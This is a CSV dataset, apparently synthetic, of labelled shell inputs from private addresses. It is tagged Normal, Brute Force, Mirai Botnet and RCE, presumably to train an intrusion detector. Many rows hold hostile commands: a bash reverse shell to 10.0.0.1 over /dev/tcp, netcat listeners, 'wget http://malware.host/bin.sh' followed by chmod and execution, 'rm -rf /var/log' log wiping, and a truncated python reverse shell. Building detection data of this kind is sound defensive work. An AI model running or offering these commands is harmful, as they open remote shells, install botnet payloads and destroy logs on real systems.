timestamp,src_ip,input,label
2026-01-08T10:46:17.306501,192.168.1.230,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.59,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.199,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.229,password,Brute Force
2026-01-08T10:46:17.308503,192.168.1.222,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.28,id,Normal
2026-01-08T10:46:17.307501,192.168.1.65,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.5,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.37,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.32,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.202,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.241,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.105,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.126,id,Normal
2026-01-08T10:46:17.307501,192.168.1.102,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.185,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.81,support,Brute Force
2026-01-08T10:46:17.309502,192.168.1.116,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.140,id,Normal
2026-01-08T10:46:17.307501,192.168.1.165,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.119,nc -lvp 4444,RCE
2026-01-08T10:46:17.309502,192.168.1.226,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.222,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.41,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.229,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.247,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.309502,192.168.1.11,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.139,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.220,id,Normal
2026-01-08T10:46:17.310501,192.168.1.21,123456,Brute Force
2026-01-08T10:46:17.311501,192.168.1.161,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.167,123456,Brute Force
2026-01-08T10:46:17.310501,192.168.1.57,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.176,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.136,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.147,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.109,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.102,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.81,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.47,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.68,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.187,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.231,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.217,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.99,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.145,password,Brute Force
2026-01-08T10:46:17.312501,192.168.1.38,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.85,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.144,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.233,nc -lvp 4444,RCE
2026-01-08T10:46:17.312501,192.168.1.234,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.310501,192.168.1.240,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.190,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.200,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.53,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.188,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.98,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.107,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.105,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.130,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.16,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.203,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.12,123456,Brute Force
2026-01-08T10:46:17.312501,192.168.1.59,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.186,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.130,support,Brute Force
2026-01-08T10:46:17.310501,192.168.1.250,password,Brute Force
2026-01-08T10:46:17.306501,192.168.1.129,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.240,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.9,id,Normal
2026-01-08T10:46:17.306501,192.168.1.24,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.171,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.160,id,Normal
2026-01-08T10:46:17.307501,192.168.1.26,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.35,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.158,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.308503,192.168.1.247,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.255,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.138,root,Brute Force
2026-01-08T10:46:17.306501,192.168.1.169,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.153,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.255,id,Normal
2026-01-08T10:46:17.312501,192.168.1.173,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.84,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.181,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.160,id,Normal
2026-01-08T10:46:17.311501,192.168.1.114,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.105,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.179,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.42,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.128,id,Normal
2026-01-08T10:46:17.312501,192.168.1.99,nc -lvp 4444,RCE
2026-01-08T10:46:17.309502,192.168.1.219,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.89,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.78,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.140,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.255,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.142,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.151,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.206,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.59,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.51,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.102,pwd,Normal
2026-01-08T10:46:17.312501,192.168.1.244,nc -lvp 4444,RCE
2026-01-08T10:46:17.306501,192.168.1.174,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.24,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.85,exit,Normal
2026-01-08T10:46:17.306501,192.168.1.193,pwd,Normal
2026-01-08T10:46:17.309502,192.168.1.135,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.213,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.144,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.215,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.145,id,Normal
2026-01-08T10:46:17.310501,192.168.1.80,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.89,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.131,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.25,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.187,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.158,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.210,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.11,admin,Brute Force
2026-01-08T10:46:17.308503,192.168.1.118,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.61,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.130,support,Brute Force
2026-01-08T10:46:17.310501,192.168.1.67,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.239,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.191,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.309502,192.168.1.230,id,Normal
2026-01-08T10:46:17.306501,192.168.1.220,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.171,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.242,id,Normal
2026-01-08T10:46:17.308503,192.168.1.146,id,Normal
2026-01-08T10:46:17.308503,192.168.1.55,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.72,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.95,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.177,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.121,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.202,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.115,admin,Brute Force
2026-01-08T10:46:17.307501,192.168.1.82,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.98,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.189,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.1,id,Normal
2026-01-08T10:46:17.306501,192.168.1.175,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.189,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.177,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.103,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.21,admin,Brute Force
2026-01-08T10:46:17.309502,192.168.1.191,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.223,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.99,exit,Normal
2026-01-08T10:46:17.306501,192.168.1.99,exit,Normal
2026-01-08T10:46:17.306501,192.168.1.206,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.54,password,Brute Force
2026-01-08T10:46:17.312501,192.168.1.55,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.311501,192.168.1.151,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.181,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.186,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.174,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.186,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.105,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.60,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.310501,192.168.1.4,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.42,id,Normal
2026-01-08T10:46:17.306501,192.168.1.254,id,Normal
2026-01-08T10:46:17.308503,192.168.1.34,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.226,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.123,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.240,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.174,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.244,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.205,id,Normal
2026-01-08T10:46:17.310501,192.168.1.124,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.198,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.19,123456,Brute Force
2026-01-08T10:46:17.312501,192.168.1.237,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.186,password,Brute Force
2026-01-08T10:46:17.310501,192.168.1.254,123456,Brute Force
2026-01-08T10:46:17.306501,192.168.1.32,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.67,id,Normal
2026-01-08T10:46:17.306501,192.168.1.21,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.240,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.173,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.173,id,Normal
2026-01-08T10:46:17.311501,192.168.1.184,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.173,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.199,id,Normal
2026-01-08T10:46:17.310501,192.168.1.120,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.132,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.246,admin,Brute Force
2026-01-08T10:46:17.307501,192.168.1.61,id,Normal
2026-01-08T10:46:17.311501,192.168.1.236,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.38,id,Normal
2026-01-08T10:46:17.306501,192.168.1.31,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.44,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.240,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.55,admin,Brute Force
2026-01-08T10:46:17.306501,192.168.1.5,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.58,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.91,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.235,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.221,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.143,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.55,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.12,nc -lvp 4444,RCE
2026-01-08T10:46:17.310501,192.168.1.195,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.68,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.10,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.54,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.229,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.234,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.179,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.186,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.214,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.221,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.7,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.227,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.85,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.240,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.190,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.42,id,Normal
2026-01-08T10:46:17.310501,192.168.1.187,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.66,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.93,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.167,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.204,support,Brute Force
2026-01-08T10:46:17.306501,192.168.1.96,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.204,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.251,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.29,exit,Normal
2026-01-08T10:46:17.306501,192.168.1.84,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.253,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.44,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.99,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.309502,192.168.1.141,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.167,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.35,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.73,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.230,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.156,id,Normal
2026-01-08T10:46:17.309502,192.168.1.27,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.247,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.203,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.138,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.80,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.151,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.200,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.150,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.172,admin,Brute Force
2026-01-08T10:46:17.307501,192.168.1.37,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.127,id,Normal
2026-01-08T10:46:17.309502,192.168.1.23,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.156,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.234,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.102,id,Normal
2026-01-08T10:46:17.307501,192.168.1.110,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.75,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.189,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.76,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.97,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.199,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.92,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.205,admin,Brute Force
2026-01-08T10:46:17.308503,192.168.1.27,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.232,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.136,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.110,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.154,nc -lvp 4444,RCE
2026-01-08T10:46:17.310501,192.168.1.67,123456,Brute Force
2026-01-08T10:46:17.307501,192.168.1.16,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.176,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.42,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.202,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.78,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.136,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.154,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.209,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.229,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.137,id,Normal
2026-01-08T10:46:17.310501,192.168.1.85,123456,Brute Force
2026-01-08T10:46:17.311501,192.168.1.116,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.180,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.123,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.186,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.12,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.160,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.172,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.113,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.236,id,Normal
2026-01-08T10:46:17.307501,192.168.1.244,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.6,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.160,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.197,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.306501,192.168.1.214,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.92,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.201,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.245,nc -lvp 4444,RCE
2026-01-08T10:46:17.307501,192.168.1.37,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.114,admin,Brute Force
2026-01-08T10:46:17.307501,192.168.1.122,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.176,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.40,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.159,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.29,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.212,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.135,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.155,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.254,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.226,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.112,pwd,Normal
2026-01-08T10:46:17.309502,192.168.1.163,password,Brute Force
2026-01-08T10:46:17.308503,192.168.1.61,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.49,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.92,id,Normal
2026-01-08T10:46:17.312501,192.168.1.186,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.51,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.201,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.158,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.126,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.34,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.236,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.90,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.155,id,Normal
2026-01-08T10:46:17.310501,192.168.1.28,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.32,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.114,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.165,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.37,123456,Brute Force
2026-01-08T10:46:17.310501,192.168.1.248,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.62,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.189,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.120,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.191,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.175,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.1,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.184,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
